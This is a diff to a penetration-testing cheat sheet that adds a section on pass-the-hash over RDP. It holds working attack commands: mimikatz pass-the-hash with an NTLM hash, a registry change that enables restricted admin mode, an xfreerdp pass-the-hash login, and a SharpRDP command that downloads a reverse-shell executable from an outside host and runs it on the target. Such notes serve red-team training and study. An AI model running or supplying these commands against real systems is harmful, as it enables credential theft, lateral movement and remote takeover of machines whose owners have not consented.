@@ -750,6 +750,23 @@ Note: You might have to change the <rdp2tcpFolder>/server/Makefile.mingw32 --> S
 9. `python2 tools/rdp2tcp.py add socks5 127.0.0.1 1080`   
 10. enjoy the tunnel with "proxychains .... targets"!
 
+### RDP PTH
+PTH over RDP is possible with restricted admin mode enabled:   
+```
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /user:admin /domain:lab.local /ntlm:3462D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
+```
+To enable restricted admin mode, perform PS remoting, then enable the mode:   
+`New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0`   
+Note: DisableRestrictAdmin set to 0 enables it!   
+
+Then RDP (via sockproxy if necessary):   
+`proxychains4 xfreerdp /u:admin /pth:3462D26CDF84D7A70E2EB3B9F05C425E /v:192.168.1.4 /cert-ignore`   
+
+To run commands over RDP, without mstsc (command line only) run SharpRDP (CASE-SENSITIVE PAYLOAD):   
+`sharprdp.exe computername=targetsrv01 username=corp\victim password=lab command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.55.75/reverseshell-processhellosvchost.exe', 'C:\Windows\Tasks\rsshll.exe'); C:\Windows\Tasks\rsshll.exe"`   
+
 ## start webserver
 - `python -m SimpleHTTPServer 80`  
 - `python3 -m http.server 7331`  
